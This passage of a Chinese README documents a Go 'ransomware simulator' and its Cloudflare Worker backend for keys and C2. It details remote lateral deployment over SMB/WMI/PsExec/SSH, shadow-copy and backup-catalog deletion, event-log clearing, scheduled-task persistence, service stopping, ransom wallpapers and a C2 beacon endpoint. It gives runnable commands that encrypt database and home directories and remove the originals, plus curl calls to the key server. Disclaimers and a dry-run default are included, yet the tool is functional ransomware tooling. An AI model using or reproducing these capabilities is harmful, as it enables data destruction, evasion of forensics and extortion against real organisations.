  **编排流程**：`端口可达性 → 凭据认证 → 投递（加密器自身 + 公钥 + 说明文件）→ 远程执行 → 回收远端日志 → 汇总报告`

| 平台（控制端） | 认证                                    | 投递             | 执行                                        | 仅投递模式       |
| -------------- | --------------------------------------- | ---------------- | ------------------------------------------- | ---------------- |
| Windows        | `net use \\host\IPC$ /user:...`         | 管理共享 `C$`    | `wmic process call create` → `schtasks /s` → `psexec` | `--remote-method smb` |
| Linux / macOS  | `ssh`（私钥；口令需 `sshpass`）          | `scp`            | `ssh ... setsid nohup ./run.sh`             | `--remote-method deploy-only` |

  **载荷与沙箱**：远端暂存目录默认 Windows `C:\ProgramData\RsSim`、Unix `/tmp/.rs_sim`；其中 `target/` 为默认加密目标沙箱，并通过 `run.bat` / `run.sh` 拉起载荷，避免多层引号转义问题。真实执行前可先用 `--remote-args "-dir <真实目录>"` 覆盖目标（Go flag 后者覆盖前者）。

  **安全护栏（重要）**：

  - 未显式指定 `--remote-confirm` 时，`remoteMode = dry-run`：远端只以 `-dry-run` 运行，**不会加密任何远端数据**；
  - 全局 `-dry-run` 会使所有远程动作自动降级为演习；
  - `-remove` 不会自动透传到远端，必须在 `--remote-args` 中显式写出；
  - 远端密码/口令会出现在本机命令行（`net use`、`wmic /password:`、`sshpass -p`），请仅在隔离演练环境使用；
  - 远程目标的真实执行依赖目标侧权限（Windows 远程创建进程通常需要管理员凭据；Windows 11 起 `wmic` 默认不再内置，会自动回退到 `schtasks`）；
  - `--remote-report` 汇总与远端日志（回收到 `remote_<host>_*.log`）用于事后取证与效果核对。

### Windows 平台特有功能

  Windows 版本具备以下平台特有的攻击链能力：

| 功能                     | 实现方式                                                     | 说明                                 |
| ------------------------ | ------------------------------------------------------------ | ------------------------------------ |
| **互斥锁单实例保护**     | `CreateMutex` / `global\ransom_mutex`                        | 防止多实例同时运行，避免文件冲突     |
| **磁盘驱动器自动枚举**   | `GetLogicalDrives` 遍历 C: 到 Z:                             | 自动发现所有可用磁盘分区             |
| **卷影副本删除**         | `vssadmin delete shadows /all /quiet`                        | 删除系统还原点，阻止通过卷影副本恢复 |
| **Windows 备份目录删除** | `wbadmin delete catalog -quiet`                              | 删除 Windows 备份编录                |
| **事件日志清除**         | `wevtutil cl System/Security/Application`                    | 清除操作痕迹，增加取证难度           |
| **排除目录**             | `C:\Windows`、`C:\Program Files`、`C:\Program Files (x86)` 等 | 跳过系统目录，避免权限错误和系统崩溃 |
| **桌面壁纸篡改**         | 内嵌 `wallpaper.ps1`（`System.Drawing`）+ `SystemParametersInfo` | 加密完成后生成勒索提示壁纸并立即设为桌面背景 |
| **生成物自排除**         | `ransom_wallpaper.png` 加入扫描排除名单                       | 防止生成物在后续运行中被自身加密     |

### 增强文件识别

#### 支持格式：

  - **数据库文件**：`.ora`, `.dmp`, `.exp`, `.ibd`, `.frm`, `.wal`
  - **网页文件**：`.html`, `.htm`, `.xhtml`, `.mht`, `.mhtml`
  - **配置文件**：`.conf`, `.cfg`, `.yml`, `.yaml`, `.toml`
  - **备份文件**：`.backup`, `.old`, `.temp`, `.swp`
  - **虚拟化文件**：`.vmdk`, `.vhd`, `.qcow2`, `.dockerfile`
  - **密钥文件**：`.key`, `.pem`, `.crt`, `.cer`, `.pfx`

### 日志系统

#### 日志文件结构：

```
程序所在目录/
├── success_encrypted.log  # 成功加密的文件列表
├── failed_encrypted.log   # 加密失败的文件列表及错误信息
└── operations.log         # 完整操作日志
```

#### 日志内容示例：

```
  =================== 勒索软件模拟器日志 ===================
  程序版本: v3.7
  开始时间: 2026-07-31 14:30:25
  运行参数: ./ransom_simulator_linux -log -workers 4
  工作目录: /home/user/tools
  =========================================================

  [2026-07-31 14:30:26] 开始停止数据库服务
  [2026-07-31 14:30:27] 停止数据库服务完成
  [2026-07-31 14:30:28] 开始清理数据库内存和缓存
  [2026-07-31 14:30:28] 清理MySQL缓存
  [2026-07-31 14:30:29] SUCCESS: /var/lib/mysql/data.ibd -> /var/lib/mysql/data.ibd.encrypted
  [2026-07-31 14:30:29] FAILED: /etc/mysql/my.cnf - 权限不足
  [2026-07-31 14:30:30] 加密工作完成: 成功 148, 失败 4
  [2026-07-31 14:30:31] 开始生成勒索提示壁纸
  [2026-07-31 14:30:33] 壁纸设置完成: C:\Tools\ransom_wallpaper.png
```

## 🛡️ 安全测试场景

### 企业环境测试

```bash
# 完整的企业攻击模拟
./ransom_simulator_linux -log \
  -dir="/var/lib/mysql,/opt/oracle,/home/project" \
  -workers=8 \
  -remove
```

### 防御演练

```bash
# 测试防御系统的检测能力
./ransom_simulator_linux -log \
  -dry-run \
  -ext=".sql,.db,.conf" \
  -workers=4
```

### 日志审计测试

```bash
# 测试日志系统的完整性
./ransom_simulator_linux -log \
  -workers=2 \
  -dir="/tmp/test_data"
```

## 🔍 模拟的关键攻击阶段 (MITRE ATT&CK®)

| **Tactic (战术)** | **ID** | **新增模拟行为**                                             |
| ----------------- | ------ | ------------------------------------------------------------ |
| **防御规避**      | TA0005 | **服务停止攻击**：停止数据库和安全服务<br>**内存清理**：清理数据库缓存和系统内存<br>**进程守护解除**：停止守护进程和定时任务<br>**v3.4 低特征对抗**：SIGTERM 替代 SIGKILL、移除 systemctl disable、随机延迟打乱时序 |
| **持久化**        | TA0003 | **增强互斥锁**：强制释放旧锁文件，自动重置状态<br>**v3.7 定时持久化**：`--persist-schedule` 注册 schtasks / systemd-run / at / crontab 定时任务 |
| **发现**          | TA0007 | **增强文件识别**：支持数据库文件、配置文件、备份文件<br>**数据库发现**：自动扫描数据库数据目录<br>**v3.7 网络与主机发现**：并发端口探测、服务指纹、本机监听端口与 ARP 邻居枚举 |
| **横向移动**      | TA0008 | **数据库攻击**：终止数据库连接，解挂网络链接<br>**v3.7 远程横向加密**：SMB/WMI/schtasks/PsExec/SSH 通道投递载荷到远端并执行、回收日志 |
| **影响**          | TA0040 | **增强加密目标**：针对企业关键资产的专项攻击<br>**详细日志记录**：完整攻击过程审计追踪 |

## 🔐 解密流程

### 方式一：浏览器端在线解密（推荐）

  无需安装任何工具，直接在浏览器中完成解密，所有操作均在本地完成。

```
1. 访问 [浏览器端解密页面](https://encrypt.yangzifun.org/decrypt)
2. 输入 UUID 获取私钥（私钥仅在浏览器内存中保存，不会上传到服务器）
3. 选择本地加密文件（`.encrypted`）或整个文件夹
4. 点击"开始解密"，文件在浏览器本地完成解密并自动下载
```

| 加密格式                    | 解密方式                                  | 说明                                                 |
| --------------------------- | ----------------------------------------- | ---------------------------------------------------- |
| **完整加密**（小文件）      | RSA-OAEP + AES-GCM 解密后直接下载原始文件 | 使用 Web Crypto API，全程浏览器本地完成              |
| **PENC 部分加密**（大文件） | 逐块解密后导出 JSON 描述文件              | 浏览器安全沙箱限制，无法直接写入原始文件，需手动合并 |

  > **隐私说明**：所有解密操作均在浏览器本地完成，私钥和文件内容不会上传到任何服务器。

### 方式二：CLI 解密工具

  1. **保存 UUID**：加密时程序会输出 UUID，请务必保存

  2. **查询私钥**：访问 [加密密钥管理系统](https://encrypt.yangzifun.org/)

     - **密钥查询**：在页面左侧输入 UUID 查询对应的 RSA 私钥
     - **密钥生成**：在页面右侧点击"生成密钥"按钮，完成 Turnstile 人机验证后即可生成新的 RSA 密钥对
     - 下载私钥文件（PEM 格式），支持复制和下载
     - 页面顶部提供系统概况面板，展示累计生成总数和趋势图

  3. **使用解密工具**：

     ```bash
     # 编译解密工具
     go build -o decryptor ./ransom_simulator/decryptor.go
     
     # 解密单个文件
     ./decryptor -key=<UUID> -file=<加密文件.encrypted>
      
     # 批量解密目录
     ./decryptor -key=<UUID> -dir=<加密文件目录>
     ```

## 🔒 API 与 Worker 服务参考

  后端服务基于 `workers/_worker.js` 实现，部署于 **Cloudflare Workers** 平台并绑定 **Cloudflare D1 数据库**。

### 🌐 页面与服务路由

| 路径               | 请求方法     | 服务说明                                                     | 校验/权限          |
| :----------------- | :----------- | :----------------------------------------------------------- | :----------------- |
| `/`                | `GET`        | **密钥管理中心主页**：UI 包含在线密钥生成、UUID 密钥查询及统计趋势图表 | 公开               |
| `/decrypt`         | `GET`        | **浏览器端在线解密页面**：零上传纯前端解密工具               | 公开               |
| `/{SECRET_PATH}`   | `POST`       | **安全路径密钥生成**（默认 `/E56dSY`）：客户端自动化调用     | 隐秘路径校验       |
| `/api/generate`    | `POST`       | **前端公共密钥生成**：Web UI 手动生成密钥接口                | Turnstile 人机验证 |
| `/query`           | `GET`        | **密钥查询接口**：根据 UUID 查询私钥与公钥                   | 公开               |
| `/stats`           | `GET`        | **统计数据接口**：获取累积生成量与历史趋势数据               | 公开               |
| `/beacon_check_in` | `GET`/`POST` | **C2 Beacon 心跳端点**：接收并记录客户端打卡日志             | 公开               |

---

### ⚙️ 端点详细说明

#### GET / （密钥管理中心主页）

  > 完整 URL：https://encrypt.yangzifun.org/
  >
  > 提供基于 Tailwind CSS 与 Chart.js 的响应式 Web 控制面板。
  >
  > - **密钥在线生成**：前端集成 Cloudflare Turnstile 部件，防止恶意刷量。
  > - **UUID 快捷查询**：可在线输入 UUID 查询公私钥，支持一键复制与 `.pem` 密钥文件下载。
  > - **生成趋势图表**：实时展现密钥生成总量、最新 UUID 记录及时间分布图。

#### GET /decrypt （浏览器端本地解密工具）

  > 完整 URL：https://encrypt.yangzifun.org/decrypt
  >
  > 返回浏览器本地文件解密 Web 工具。
  >
  > - **隐私安全**：所有解密运算通过浏览器 **Web Crypto API** 本地完成，私钥仅存在于内存，源文件与解密数据**绝不上传**至服务端。
  >
  > - **批量与文件夹支持**：支持选择单个 `.encrypted` 文件或整文件夹批处理。
  >
  > - **多格式兼容**：
  >
  >   | 加密格式                    | 解密方式                    | 结果输出                                              |
  >   | --------------------------- | --------------------------- | ----------------------------------------------------- |
  >   | **标准完整加密**（小文件）  | RSA-OAEP + AES-GCM 本地解密 | 自动触发浏览器下载还原后的原始文件                    |
  >   | **PENC 部分加密**（大文件） | 逐块解密分片数据            | 导出包含偏移量与解密块信息的 `.decrypted_chunks.json` |

#### POST /E56dSY （密钥生成，安全路径）

  > 完整 URL：https://encrypt.yangzifun.org/E56dSY
  >
  > 无人值守安全路径接口，供勒索模拟器 Go 客户端自动调用。默认路径为 `E56dSY`，可在 Worker 中通过 `SECRET_PATH` 环境变量自定义。

```bash
curl -X POST https://encrypt.yangzifun.org/E56dSY \
  -H "Content-Type: application/json" \
  -d '{}'
```

```json
{
    "status": "success",
    "message": "UUID 和 RSA 密钥对生成并保存成功。",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key_pem": "-----BEGIN PRIVATE KEY-----\n...",
    "public_key_jwk": { ... },
    "private_key_jwk": { ... }
}
```

#### POST /api/generate （密钥生成，Web UI）

  > 完整 URL：https://encrypt.yangzifun.org/api/generate
  >
  > 前端 Web UI 调用的密钥生成接口，支持 Turnstile 人机验证。

  **请求体：**

```json
{
    "cf-turnstile-response": "xxx"
}
```

#### GET /query?uuid=xxx （密钥查询 API）

  > 完整 URL：https://encrypt.yangzifun.org/query?uuid=xxx

```bash
curl "https://encrypt.yangzifun.org/query?uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
```

```json
{
    "status": "success",
    "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "public_key": "-----BEGIN PUBLIC KEY-----\n...",
    "private_key": "-----BEGIN PRIVATE KEY-----\n...",
    "rid": "..."
}
```

#### GET /stats?range=1m （统计数据 API）

  > 完整 URL：https://encrypt.yangzifun.org/stats?range=1m

```bash
curl "https://encrypt.yangzifun.org/stats?range=1m"
```

| 参数    | 可选值                 | 说明                    |
| ------- | ---------------------- | ----------------------- |
| `range` | `1m`, `3m`, `6m`, `1y` | 统计时间范围（默认 1m） |

#### GET/POST /beacon_check_in （C2 Beacon 心跳端点）

  > 完整 URL：https://encrypt.yangzifun.org/beacon_check_in
  >
  > 用于模拟器上线/加密完成的心跳打卡。服务端在 Cloudflare Worker 控制台实时打印包含 `CF-Connecting-IP`、`User-Agent` 及时间戳的 JSON 告警日志。

---

### 🛠️ Cloudflare Worker 部署与配置说明

  文件位置：`workers/_worker.js`

#### 1. D1 数据库绑定

  Worker 需绑定名称为 `DB` 的 Cloudflare D1 数据库，主要表结构如下：

  - **`keys` 表**：保存加密生成的密钥对历史记录（字段：`uuid`, `public_key`, `private_key`, `rid`, `created_at`）。
  - **`key_metrics` 表**：持久化保存统计指标（字段：`total_generated`, `latest_uuid`, `latest_generated_at`），即使 `keys` 表清理定期数据，累计生成总量亦不会重置。

#### 2. 环境变量 (Environment Variables)

| 变量名                 | 默认值   | 说明                                                       |
| ---------------------- | -------- | ---------------------------------------------------------- |
| `SECRET_PATH`          | `E56dSY` | 客户端自动化请求密钥的安全路径（不含前导斜杠 `/`）         |
| `TURNSTILE_SITE_KEY`   | *(可选)* | 前端 Turnstile Widget 部件 Site Key                        |
| `TURNSTILE_SECRET_KEY` | *(可选)* | 后端校验 Turnstile Token 的 Secret Key（未设置时跳过校验） |

### 重要注意事项

  - **UUID 和私钥：** UUID 是识别密钥的唯一凭证，私钥是解密文件的**唯一密钥**。**务必妥善保存！** 丢失私钥将导致文件永远无法解密。
  - **网络连接：** 加密过程需要访问 Cloudflare Worker API，请确保网络稳定。
  - **API 限制：** 脚本、程序及 API 服务会不定时更新，如遇执行错误，请从密钥查询页面更新程序。
  - **数据保存：** 本系统会定期清理 `keys` 表，如需保留密钥请尽快下载私钥文件。统计总数（总生成次数、最新记录等）独立存储在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据。
  - **重要声明：** **该站点提供的脚本仅用于演练防加密勒索，其他用途及使用过程中数据丢失与本服务无关！** 加密过程中源文件默认不会被自动清除；仅当显式使用 `-remove` 时才会删除源文件（此时壁纸与勒索信会同步显示“已删除源文件”提示）。
- **v3.7 远程编排声明：** 攻击面侦察（`--scan`）与远程横向加密（`--remote-*`）**仅可在你拥有合法授权的隔离环境内使用**。远程编排默认处于演练护栏（只做连通性与投递，远端以 `-dry-run` 运行），必须显式 `--remote-confirm` 才会真实执行；对未授权主机进行扫描或投递均可能构成违法行为，请自行承担全部责任。
  - **系统影响：** 非演习模式下会**修改当前用户的桌面壁纸**（生成 `ransom_wallpaper.png` 并设为背景）并向桌面写入勒索信，请在演练前备份壁纸设置，演练后自行还原。

## ⚠️ 免责声明

  **重要提醒**：本工具为**安全研究和培训专用**，严禁用于非法用途！

### 使用前必须确认：

1. ✅ 仅在合法授权的环境中使用
2. ✅ 获取系统所有者的明确授权
3. ✅ 在隔离的测试环境中运行
4. ✅ 备份所有重要数据

### 法律责任：

  - 开发者不对任何滥用行为负责
  - 使用者需承担全部法律责任
  - 违反法律规定的使用将面临法律制裁

  **真实勒索软件是严重犯罪行为！本工具仅用于教育和防御研究。**

## 📞 支持与贡献

### 问题反馈

  - GitHub Issues: [报告问题](https://github.com/yangzifun/ransom_simulator/issues)
  - 安全漏洞: 请通过GitHub私密报告

### 贡献指南

1. Fork 项目仓库
2. 创建功能分支
3. 提交更改
4. 推送分支
5. 创建Pull Request

## 🔗 项目链接

  - **GitHub仓库**: https://git.yangzifun.org/YZFN/ransom_simulator
  - **密钥管理系统**: https://encrypt.yangzifun.org/
  - **C2服务器**: Cloudflare Workers 实现（`workers/_worker.js`）
  - **文档**: 完整技术文档和使用指南

---

  **最后提醒**：网络安全是共同责任，使用本工具时请始终遵循道德和法律准则。让我们共同建设更安全的网络环境！
